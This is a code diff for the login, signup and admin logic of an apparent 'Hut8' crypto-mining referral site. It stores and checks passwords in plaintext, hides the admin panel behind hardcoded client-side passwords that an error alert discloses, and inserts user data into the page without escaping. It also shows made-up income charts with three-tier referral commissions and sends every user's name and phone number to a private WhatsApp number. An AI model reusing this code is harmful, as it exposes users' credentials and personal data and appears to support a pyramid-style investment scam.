-window.onload=()=>{
-const urlParams=new URLSearchParams(window.location.search);
-let ref=urlParams.get('ref')||urlParams.get('invite')||urlParams.get('code');
-if(ref){localStorage.setItem('hut_referrer',ref);let inv=document.getElementById('inviteCode');if(inv) inv.value=ref;}
-let lastPhone=localStorage.getItem('hut_last_phone')||'';
-if(lastPhone) document.getElementById('loginUser').value=lastPhone;
-document.getElementById('authScreen').style.display='flex';
-switchAuth('login');
-if(urlParams.get('admin')==='ben2026'){openModal('adminModal');}
-setTimeout(()=>{try{new Chart(document.getElementById('chartHome'),{type:'line',data:{labels:['Mon','Tue','Wed','Thu','Fri','Sat','Sun'],datasets:[{data:[0,12,19,33,45,52,67],borderColor:'#00A6FF',tension:0.4,fill:true,backgroundColor:'rgba(0,166,255,0.2)'}]},options:{plugins:{legend:{display:false}}}});new Chart(document.getElementById('chartIncome'),{type:'bar',data:{labels:['CS-1','CS-2','VIP-1','VIP-2'],datasets:[{data:[33711,112408,6800000,13500000],backgroundColor:'#00A6FF'}]},options:{plugins:{legend:{display:false}}}});new Chart(document.getElementById('chartTeam'),{type:'doughnut',data:{labels:['L1 10%','L2 5%','L3 2%'],datasets:[{data:[60,30,10],backgroundColor:['#00A6FF','#ff6b2c','#00D632']}]},options:{plugins:{legend:{labels:{color:'white'}}}}});}catch(e){}},900);
-}
+async function doSignup(){let name=document.getElementById('fullName').value.trim();let phone=document.getElementById('phoneReg').value.trim();let email=document.getElementById('emailReg').value.trim();let pass=document.getElementById('passReg').value;let conf=document.getElementById('passConfirm').value;if(name.length<3){alert('Enter Full Name');return;}if(phone.length<10){alert('Enter Phone');return;}if(pass.length<6){alert('Password min 6');return;}if(pass!==conf){alert('Passwords no match');return;}let user={name,phone,email,pass,referrer:localStorage.getItem('hut_referrer')||document.getElementById('inviteCode').value||'Direct',date:new Date().toLocaleString(),createdAt:firebase.firestore.FieldValue.serverTimestamp()};try{await db.collection('users').doc(phone).set(user);localStorage.setItem('hut_user',JSON.stringify(user));localStorage.setItem('hut_user_name',name);localStorage.setItem('hut_last_phone',phone);document.getElementById('loginUser').value=phone;switchAuth('login');alert('✅ SAVED TO CLOUD! Now LOGIN!');}catch(e){alert('Firestore error: '+e.message+' Make sure you created Firestore Database in test mode!');}}
+async function doLogin(){let lu=document.getElementById('loginUser').value.trim();let lp=document.getElementById('loginPass').value;try{let doc=await db.collection('users').doc(lu).get();let found=null;if(doc.exists && doc.data().pass===lp) found=doc.data();else{let snap=await db.collection('users').where('email','==',lu).get();snap.forEach(d=>{if(d.data().pass===lp) found=d.data();});}if(!found){alert('Wrong phone/email or password! Check cloud!');return;}localStorage.setItem('hut_user',JSON.stringify(found));localStorage.setItem('hut_user_name',found.name);localStorage.setItem('hut_last_phone',found.phone);document.getElementById('authScreen').style.display='none';document.getElementById('userBadge').innerText=found.name.split(' ')[0];document.getElementById('topName').innerText='Hi, '+found.name.split(' ')[0];document.getElementById('profileName').innerText=found.name;document.getElementById('userMomo').innerText=found.phone;document.getElementById('userEmail').innerText=found.email;let link='https://tinyurl.com/Hut8MiningUg?ref='+found.phone;document.getElementById('myInviteBox').innerHTML='<b style=color:#00A6FF>Your Invite Link:</b><br><small>'+link+'</small><br><button onclick="navigator.clipboard.writeText(\''+link+'\');alert(\'Copied!\')" style=background:#00A6FF;border:none;padding:8px;border-radius:8px;color:white;margin-top:8px;width:100%>📋 Copy My Link</button>';document.getElementById('welcomeMsg').innerText='Welcome '+found.name+'! ☁️ Cloud login OK!';openModal('msgModal');}catch(e){alert('Login error: '+e.message);}}
+function logout(){document.getElementById('authScreen').style.display='flex';switchAuth('login');}
+async function unlockAdmin(){let p=document.getElementById('adminPass').value;if(p!=='Ben2026' && p!=='0779434443'){alert('Wrong Admin Password! Use Ben2026');return;}document.getElementById('adminContent').style.display='block';try{let snap=await db.collection('users').orderBy('createdAt','desc').get();document.getElementById('userCount').innerText=snap.size;let table=document.getElementById('adminTable');table.innerHTML='<tr><th>Name</th><th>Phone</th><th>Email</th><th>Ref</th><th>Date</th></tr>';snap.forEach(doc=>{let u=doc.data();let tr=document.createElement('tr');tr.innerHTML=`<td>${u.name}</td><td>${u.phone}</td><td>${u.email}</td><td>${u.referrer}</td><td>${u.date}</td>`;table.appendChild(tr);});if(snap.size===0) table.innerHTML+='<tr><td colspan=5 style=text-align:center>No cloud users yet. Signup first!</td></tr>';}catch(e){alert('Admin load error: '+e.message+' - Did you enable Firestore?');}}
+function exportUsers(){db.collection('users').get().then(snap=>{let txt='Hut8 Cloud Users '+snap.size+'\n';snap.forEach(d=>{let u=d.data();txt+=u.name+' - '+u.phone+' - Ref:'+u.referrer+'\n';});window.open(`https://wa.me/256779434443?text=${encodeURIComponent(txt)}`,'_blank');});}
+window.onload=()=>{let ref=new URLSearchParams(window.location.search).get('ref');if(ref){localStorage.setItem('hut_referrer',ref);let inv=document.getElementById('inviteCode');if(inv) inv.value=ref;}let last=localStorage.getItem('hut_last_phone');if(last) document.getElementById('loginUser').value=last;document.getElementById('authScreen').style.display='flex';try{new Chart(document.getElementById('chartHome'),{type:'line',data:{labels:['Mon','Tue','Wed','Thu','Fri','Sat','Sun'],datasets:[{data:[0,12,19,33,45,52,67],borderColor:'#00A6FF',tension:0.4,fill:true,backgroundColor:'rgba(0,166,255,0.2)'}]},options:{plugins:{legend:{display:false}}}});new Chart(document.getElementById('chartIncome'),{type:'bar',data:{labels:['CS-1','CS-2','VIP-1'],datasets:[{data:[33711,112408,6800000],backgroundColor:'#00A6FF'}]},options:{plugins:{legend:{display:false}}}});new Chart(document.getElementById('chartTeam'),{type:'doughnut',data:{labels:['L1 10%','L2 5%','L3 2%'],datasets:[{data:[60,30,10],backgroundColor:['#00A6FF','#ff6b2c','#00D632']}]},options:{plugins:{legend:{labels:{color:'white'}}}}});}catch(e){}}
 </script></body></html>
